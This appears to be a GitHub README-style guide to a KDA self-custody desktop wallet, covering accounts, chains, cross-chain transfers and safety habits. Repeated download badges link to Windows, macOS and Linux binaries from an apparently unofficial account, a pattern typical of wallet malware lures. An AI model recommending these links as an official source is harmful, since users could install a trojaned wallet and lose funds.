![Kadena Wallet](assets/banner-article.png)

<h1 align="center">What Kadena Wallet Is, and What Self-Custody Actually Means</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Self-custody is usually explained with a metaphor, and the metaphor is where the confusion starts. A wallet does not hold coins. It holds key material, and it uses that key material to sign instructions that the network either accepts or rejects. Everything practical about owning KDA follows from that one sentence.

Kadena Wallet is a desktop application that performs that job on your own machine. This explains what it does, what it deliberately cannot do, and how to tell whether any self-custody wallet is doing the job properly.

## You'll see this if

- You are comparing wallets and every description is adjectives rather than mechanics.
- You want to know what happens to your KDA if the company behind a wallet disappears.
- You have a recovery phrase and are not certain what it actually controls.
- You are unsure whether a balance shown in an app exists anywhere other than that app.

## What you hold, and what the chain holds

A balance is not a file on your computer. It is state on a chain, recorded against an account, and the account is a name paired with a rule about who may move its funds. Your key satisfies that rule. Your wallet is the tool that applies it.

| Question | Custodial account | Self-custody |
| --- | --- | --- |
| Who can move the funds | The provider, with your login | Whoever holds the key |
| What you actually have | A claim on the provider | Key material |
| If the provider disappears | The claim depends on a process | Nothing changes on-chain |
| Recovery | Password reset, support ticket | The recovery phrase, and nothing else |

That table is the whole argument. Self-custody removes an intermediary and replaces it with an obligation: nobody can restore your access, because nobody else has it.

## What the wallet does, in order

Every self-custody wallet runs the same five steps. The differences between products live in how visible each step is.

| Step | What happens | Where it happens |
| --- | --- | --- |
| 1. Derive | The phrase produces a private key, and the key produces an address | On your machine |
| 2. Build | A transaction is assembled: source, destination, amount, chain, fee | On your machine |
| 3. Sign | The private key signs the transaction | On your machine |
| 4. Submit | The signed transaction goes to a node | Over the network |
| 5. Confirm | The chain includes it, and state changes | On the chain |

Step 4 is the only step that needs the internet, and it is the only step where a server sees anything. A wallet that asks for your phrase at any point after setup has broken this model, and there is no legitimate reason for it to do so.

## The four Kadena details that change the answer

Kadena is not an account-based chain in the way most wallet copy assumes, and four properties matter more than any feature list.

**An account is a name plus a guard.** A key authorises; an account stores. The guard is the condition the chain checks before value moves, and the name is what that condition is attached to. This is why creating an account on a destination chain asks for a guard, not only an address.

**A `k:` address is a principal, not a location.** It is the letter `k`, a colon, and 64 hexadecimal characters, 66 in total. It is derived from your key, so you cannot choose it, and it exists on all twenty chains at once.

**Balances are per chain.** The same account name can hold different amounts on chain 0 and chain 7, because each chain keeps its own state. An address alone never tells you where the funds are; the chain does.

**Cross-chain transfers are two operations.** The source chain debits and yields a proof, then the destination chain is credited when that proof is submitted. A wallet that signs only the first half leaves the transfer visibly unfinished, which is the single most common "stuck funds" report on this network.

## What self-custody costs you

The costs are real, and a wallet page that omits them is selling rather than explaining.

- **There is no reset.** Lose the phrase and the account is unreachable. Not locked, not frozen, simply unreachable by anyone, forever.
- **Support cannot help.** Anyone who offers to restore access is describing theft, because the only recovery path is the phrase you already hold.
- **You are the security boundary.** Clipboard malware that swaps a destination address, a fake build from a lookalike domain, and a convincing "support" message are the three ways people lose funds. None of them is a chain failure.
- **Mistakes are final.** A transaction that the network accepts cannot be reversed by the sender, the wallet developer, or the stewards of the network.

The trade is straightforward: you accept operational responsibility in exchange for removing a third party's ability to deny you access. Whether that trade suits you depends on whether you will actually store a phrase properly.

## What the wallet cannot do

Four limits are worth stating plainly, because every one of them is a promise someone will make to you.

- It cannot restore a phrase. There is no escrow, no backup server, and no support override.
- It cannot reverse a transaction. Inclusion is final, whoever signed it.
- It cannot freeze or move funds in an account it does not control.
- It cannot vouch for a token, a contract, or a bridge. Holding KDA says nothing about anything else you might be offered.

A wallet is a signer and a viewer. Claims beyond those two roles are either convenience features or a request for trust you have not agreed to.

## How to judge any self-custody wallet

Six questions separate a tool from a claim. They apply to Kadena Wallet and to every alternative.

1. **Can the phrase be exported and re-imported elsewhere?** If the answer is no, the wallet is a custodian wearing a different word.
2. **Does it show the address before you fund it, and the derivation it used?** You need to know which account you are about to use, not just that one exists.
3. **Can you choose the chain?** A wallet that hides the chain selector will eventually show you a zero balance that is not zero.
4. **Does it validate what you paste?** A `k:` principal is 66 characters, hex after the prefix. Catching a truncated address before signing is the cheapest safety feature there is.
5. **Is the source published?** Not a promise that it is audited, not a claim that it is reproducible: published, so someone can read it.
6. **Does it ask for the phrase after setup?** It should never do so, under any circumstance, including "verification".

A wallet can score well on all six and still be unsuitable for you, but it cannot score badly on any of them and be safe.

## If a phrase does not reproduce your account

This is the most common self-custody failure that is not a loss. A wallet can accept a phrase and derive keys that control nothing, because derivation is a choice rather than a universal.

- **Wrong derivation.** Chainweaver built keys from its own 12-word master seed instead of a BIP44 ladder. Software that lacks that scheme still takes the words and presents a new, empty account.
- **Wrong chain.** The account exists, and the balance is on a chain the wallet is not displaying.
- **Legacy account.** Accounts created before the `k:` convention are named by the bare public key. They still work, and they are not the same account as the `k:` principal for the same key.

A phrase being accepted proves only that the words are valid. What proves recovery is an address, or a balance, that you can recognise.

## Prevention, in four habits

- Write the phrase by hand, once, and keep two offline copies in separate places.
- Send a small test amount to any new address before sending the rest.
- Confirm the destination on-chain, on the chain you intend, before and after the first transfer.
- Treat every unsolicited message about your wallet as hostile, including ones that quote your own address back to you.

## FAQ

**Does the wallet hold my KDA?**
No. The chain holds the balance against your account. The wallet holds the key that authorises spending and the interface that displays state.

**What happens if Kadena Wallet stops being maintained?**
The phrase still controls the accounts, and any wallet that implements the same derivation can open them. That is the practical meaning of self-custody, and it is worth testing before you need it.

**Is a hardware wallet required?**
No. A device moves signing onto a separate computer and removes a class of malware risk. The paper copy of the phrase remains the backup either way.

**Can I use the same phrase in two wallets at once?**
Yes, and both will control the same accounts. That is useful for recovery testing and dangerous if one of the two is not trustworthy.

**Does self-custody mean the funds are safe?**
It means nobody else can deny you access. Safety from your own mistakes, malware and phishing remains your responsibility, which is why the habits above matter more than the software.

## Related reading

- How to create a KDA account in Kadena Wallet
- Choosing a chain before you receive KDA
- Cross-chain transfers in Kadena Wallet
- Kadena Wallet security: a threat model you can act on

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [How to Create a KDA Account in Kadena Wallet](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/how-to-create-a-kda-account-in-kadena-wallet.md)
- [Choosing a Chain in Kadena Wallet: Why Balances Differ](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/choosing-a-chain-in-kadena-wallet.md)
- [Chainweb's Twenty Chains, Explained for Wallet Users](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/chainweb-twenty-chains-in-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
